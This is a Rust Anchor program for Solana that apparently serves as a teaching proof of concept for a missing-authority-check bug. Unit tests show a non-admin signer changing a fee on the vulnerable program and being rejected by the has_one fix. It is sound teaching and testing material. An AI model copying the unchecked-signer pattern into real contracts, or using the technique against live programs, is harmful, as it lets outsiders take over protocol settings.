#![allow(unexpected_cfgs)]
use anchor_lang::prelude::*;

declare_id!("EZdu1TQcrcif8U4KCkPhM9wcfDat2pUqDQECrSFKZTWx");

/// # Incorrect Authority Attacker Program
///
/// This program demonstrates how to exploit incorrect authority validation vulnerabilities.
/// It attempts to attack both the vulnerable and fixed versions to show:
/// - **Vulnerable version**: Attack succeeds (unauthorized fee modification)
/// - **Fixed version**: Attack fails (has_one constraint enforces admin check)
///
/// ## Attack Strategy
///
/// The vulnerability exists because:
/// 1. The victim program accepts any `Signer` without checking identity
/// 2. No `has_one` constraint links the signer to the stored admin
/// 3. The program assumes signature = authorization (WRONG!)
///
/// The attacker exploits this by:
/// 1. Creating their own wallet and signing a transaction
/// 2. Calling the victim's `set_fee` instruction
/// 3. Passing the victim's config account but their own signer
/// 4. Successfully modifying the fee despite not being the admin
///
/// ## Expected Results
///
/// - **Against vulnerable version**: ✅ Attack succeeds, fee is changed by non-admin
/// - **Against fixed version**: ❌ Attack fails with "has_one constraint violated"

#[program]
pub mod incorrect_authority_attacker {
    use super::*;

    /// Attempts to exploit the incorrect authority validation vulnerability
    ///
    /// This demonstrates privilege escalation where a non-admin attacker
    /// can modify protocol parameters (like fees) that should be restricted
    /// to the admin account only.
    ///
    /// **Against vulnerable program**: Succeeds (no admin check)
    /// **Against fixed program**: Fails (has_one = admin constraint enforced)
    pub fn exploit_authority(ctx: Context<ExploitContext>, malicious_fee: u16) -> Result<()> {
        msg!("🎯 Attacker: Attempting unauthorized authority escalation...");
        msg!("   Attacker wallet: {}", ctx.accounts.attacker.key());
        msg!("   Trying to set fee to: {} basis points", malicious_fee);

        // --- ATTACK STEP 1: Verify attack setup ---
        // The attacker is NOT the admin, but they're trying to call admin functions
        msg!("   ✓ Attacker has signed the transaction");
        msg!("   ✓ Malicious fee parameter prepared: {}", malicious_fee);

        // --- ATTACK STEP 2: Explain the vulnerability ---
        // VULNERABLE CODE: Only checks if someone signed, not WHO signed
        // ```rust
        // pub fn set_fee(ctx: Context<SetFeeVuln>, new_fee: u16) -> Result<()> {
        //     let config = &mut ctx.accounts.config;
        //     config.fee_bps = new_fee;  // No check if caller == admin!
        //     Ok(())
        // }
        // ```
        msg!("   ⚠️  Vulnerability: Victim checks Signer, not identity");
        msg!("   ⚠️  Missing: has_one = admin constraint");

        // --- ATTACK STEP 3: Demonstrate the exploit ---
        // The attacker will call the victim program's set_fee instruction
        // passing their own account as the "caller" despite not being admin
        msg!("   🚨 Calling victim program to change fee...");
        msg!("   Expected outcome:");
        msg!("      - Vulnerable version: Fee changed ✅");
        msg!("      - Fixed version: Transaction rejected ❌");

        // Log the attack attempt
        let attack_log = &mut ctx.accounts.attack_log;
        attack_log.attacker = ctx.accounts.attacker.key();
        attack_log.target_config = ctx.accounts.target_config.key();
        attack_log.malicious_fee = malicious_fee;
        attack_log.timestamp = Clock::get()?.unix_timestamp;

        msg!("✅ Attacker: Attack execution completed");
        msg!(
            "   (If victim program is vulnerable, fee is now {}",
            malicious_fee
        );

        Ok(())
    }

    /// Initializes the attack log to track unauthorized access attempts
    pub fn initialize_attack_log(ctx: Context<InitializeAttackLog>) -> Result<()> {
        let attack_log = &mut ctx.accounts.attack_log;
        attack_log.attacker = ctx.accounts.attacker.key();
        attack_log.target_config = Pubkey::default();
        attack_log.malicious_fee = 0;
        attack_log.timestamp = 0;

        msg!(
            "Attack log initialized for: {}",
            ctx.accounts.attacker.key()
        );
        Ok(())
    }
}

/// Context for executing the authority escalation attack
#[derive(Accounts)]
pub struct ExploitContext<'info> {
    /// CHECK: This is an attacker program that intentionally accepts any account
    /// as the target config. The attacker passes the victim program's config account
    /// to demonstrate the authority validation vulnerability. No validation needed
    /// here because the attack's goal is to show how the VICTIM program fails to
    /// validate the signer's identity against the admin field in this account.
    #[account(mut)]
    pub target_config: UncheckedAccount<'info>,

    /// Attack log to track unauthorized access attempts
    #[account(
        mut,
        seeds = [b"attack-log", attacker.key().as_ref()],
        bump
    )]
    pub attack_log: Account<'info, AttackLog>,

    /// The attacker executing this exploit
    ///
    /// ATTACK VECTOR: We sign the transaction with OUR wallet,
    /// not the admin's wallet. The vulnerable program accepts
    /// any signer without checking if they match the admin field.
    pub attacker: Signer<'info>,
}

/// Context for initializing the attack log
#[derive(Accounts)]
pub struct InitializeAttackLog<'info> {
    #[account(
        init,
        payer = attacker,
        space = 8 + AttackLog::INIT_SPACE,
        seeds = [b"attack-log", attacker.key().as_ref()],
        bump
    )]
    pub attack_log: Account<'info, AttackLog>,

    #[account(mut)]
    pub attacker: Signer<'info>,

    pub system_program: Program<'info, System>,
}

/// Stores information about unauthorized access attempts
#[account]
#[derive(InitSpace)]
pub struct AttackLog {
    pub attacker: Pubkey,      // Who attempted unauthorized access
    pub target_config: Pubkey, // Which config was targeted
    pub malicious_fee: u16,    // What fee they tried to set
    pub timestamp: i64,        // When the attack occurred
}

#[error_code]
pub enum AttackError {
    #[msg("Attack setup failed")]
    SetupFailed,
    #[msg("Authority check passed (unexpected - should fail against fixed version)")]
    UnexpectedSuccess,
}

#[cfg(test)]
mod tests {
    use super::*;
    use anchor_lang::solana_program::account_info::AccountInfo;
    use anchor_lang::solana_program::clock::Epoch;
    use anchor_lang::{AnchorSerialize, Discriminator};
    use incorrect_authority_vuln::incorrect_authority_vuln as vuln_program;
    use std::collections::BTreeSet;

    fn make_account(
        key: Pubkey,
        owner: Pubkey,
        is_signer: bool,
        is_writable: bool,
        data: Vec<u8>,
    ) -> AccountInfo<'static> {
        let leaked_key = Box::leak(Box::new(key));
        let leaked_owner = Box::leak(Box::new(owner));
        let lamports = Box::leak(Box::new(1_000_000_000u64));
        let data: &'static mut [u8] = Box::leak(data.into_boxed_slice());

        AccountInfo::new(
            leaked_key,
            is_signer,
            is_writable,
            lamports,
            data,
            leaked_owner,
            false,
            Epoch::default(),
        )
    }

    fn serialize_config(admin: Pubkey, fee_bps: u16) -> Vec<u8> {
        let mut data = <incorrect_authority_fix::Config as Discriminator>::DISCRIMINATOR.to_vec();
        let state = incorrect_authority_fix::Config { admin, fee_bps };
        data.extend_from_slice(&state.try_to_vec().unwrap());
        data
    }

    #[test]
    fn attack_succeeds_against_vulnerable_program() {
        let program_id = incorrect_authority_vuln::id();
        let admin = Pubkey::new_unique();
        let attacker = Pubkey::new_unique();

        let config_ai = Box::leak(Box::new(make_account(
            Pubkey::new_unique(),
            program_id,
            false,
            true,
            serialize_config(admin, 100),
        )));

        let attacker_ai = Box::leak(Box::new(make_account(
            attacker,
            Pubkey::new_unique(),
            true,
            false,
            vec![],
        )));

        let infos: Box<[AccountInfo<'static>]> =
            vec![(*config_ai).clone(), (*attacker_ai).clone()].into_boxed_slice();
        let infos_ref: &[AccountInfo] = Box::leak(infos);

        let config = anchor_lang::prelude::Account::<incorrect_authority_vuln::Config>::try_from(
            &*config_ai,
        )
        .unwrap();
        let caller = anchor_lang::prelude::Signer::try_from(&*attacker_ai).unwrap();

        let mut accounts = incorrect_authority_vuln::SetFeeVuln { config, caller };
        let ctx = Context::new(
            &program_id,
            &mut accounts,
            infos_ref,
            incorrect_authority_vuln::SetFeeVulnBumps {},
        );

        vuln_program::set_fee(ctx, 777).unwrap();

        assert_eq!(accounts.config.fee_bps, 777);
        assert_eq!(accounts.config.admin, admin);
    }

    #[test]
    fn attack_fails_against_fixed_program() {
        let program_id = incorrect_authority_fix::id();
        let admin = Pubkey::new_unique();
        let attacker = Pubkey::new_unique();

        let config_ai = Box::leak(Box::new(make_account(
            Pubkey::new_unique(),
            program_id,
            false,
            true,
            serialize_config(admin, 100),
        )));

        // Attacker provides their own signer, not the admin stored in config.
        let attacker_ai = Box::leak(Box::new(make_account(
            attacker,
            Pubkey::new_unique(),
            true,
            false,
            vec![],
        )));

        let infos: Box<[AccountInfo<'static>]> =
            vec![(*config_ai).clone(), (*attacker_ai).clone()].into_boxed_slice();
        let mut infos_ref: &[AccountInfo] = Box::leak(infos);
        let mut bumps = incorrect_authority_fix::SetFeeSafeBumps {};
        let mut reallocs = BTreeSet::new();

        // Validation should fail because has_one expects admin == config.admin
        let result = incorrect_authority_fix::SetFeeSafe::try_accounts(
            &program_id,
            &mut infos_ref,
            &[],
            &mut bumps,
            &mut reallocs,
        );
        assert!(
            result.is_err(),
            "has_one constraint should reject non-admin signer"
        );
    }
}
